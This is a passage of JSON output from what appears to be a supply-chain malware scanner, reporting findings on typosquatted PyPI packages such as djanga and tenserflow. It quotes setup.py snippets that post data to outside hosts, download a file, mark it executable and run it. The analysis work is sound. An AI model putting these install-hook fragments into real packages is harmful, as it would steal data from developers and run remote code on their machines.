        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "virtualnv-0.1.1/setup.py:32": "  s.send(\"POST / HTTP/1.1\\r\\n\"+\n  \"User-Agent: Python\\r\\n\"+\n  \"Host: packageman.comlu.com\\r\\n\"+\n  \"Content-Type: application/x-www-form-urlencoded\\r\\n\"+\n  \"Content-Length: \"+str(len(posty))+\"\\r\\n\\r\\n\"+posty)"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": [
            "virtualenv"
        ]
    },
    "djanga": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {},
        "download-executable": {
            "djanga-0.1/libari/pr.py:13": "        \td = open (LOC, \"wb\")\n        \td.write (response.read ())\n        \td.close ()\n\n        \tcurrent_state = os.stat (LOC)\n        \tos.chmod (LOC, current_state.st_mode|stat.S_IEXEC)",
            "djanga-0.1/setup.py:29": "                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)"
        },
        "exec-base64": {},
        "code-execution": {
            "djanga-0.1/setup.py:40": "                system (\"~/.drv\")"
        },
        "cmd-overwrite": {},
        "typosquatting": [
            "django"
        ]
    },
    "python-mysql": {
        "shady-links": {},
        "exfiltrate-sensitive-data": {
            "python-mysql-1.0.0/setup.py:26": "        request.urlopen(r'http://mysql.openvc.org/mysql.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))",
            "python-mysql-1.0.0/setup.py:28": "        urllib.urlopen(r'http://mysql.openvc.org/mysql.php','vid='+base64.encodestring(vid))"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {},
        "typosquatting": [
            "mysql-python",
            "pymysql"
        ]
    },
    "tenserflow": {
        "shady-links": {
            "setup.py:41": "        url='http://us.dslab.pw/webhook.php',"
        },
        "exfiltrate-sensitive-data": {
            "setup.py:40": "    request(\n        url='http://us.dslab.pw/webhook.php',\n        method='POST',\n        data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n        headers=headers\n    )"
        },
        "download-executable": {},
        "exec-base64": {},
        "code-execution": {},
        "cmd-overwrite": {
            "tools/pip_package/setup.py:239": "setup(\n    name=project_name,\n    version=_VERSION.replace('-', ''),\n    description=DOCLINES[0],\n    long_description='\\n'.join(DOCLINES[2:]),\n    url='https://www.tensorflow.org/',\n    download_url='https://github.com/tensorflow/tensorflow/tags',\n    author='Google Inc.',\n    author_email='opensource@google.com',\n    # Contained modules and scripts.\n    packages=find_packages(),\n    entry_points={\n        'console_scripts': CONSOLE_SCRIPTS,\n    },\n    headers=headers,\n    install_requires=REQUIRED_PACKAGES,\n    tests_require=REQUIRED_PACKAGES + TEST_PACKAGES,\n    # Add in any packaged data.\n    include_package_data=True,\n    package_data={\n        'tensorflow': [\n            EXTENSION_NAME,\n        ] + matches,\n    },\n    zip_safe=False,\n    distclass=BinaryDistribution,\n    cmdclass={\n        'install_headers': InstallHeaders,\n        'install': InstallCommand,\n    },\n    # PyPI package information.\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Scientific/Engineering',\n        'Topic :: Scientific/Engineering :: Mathematics',\n        'Topic :: Scientific/Engineering :: Artificial Intelligence',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: Libraries',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    license='Apache 2.0',\n    keywords='tensorflow tensor machine learning',\n)"
        },
        "typosquatting": [
            "tensorflow"
        ]
    }
}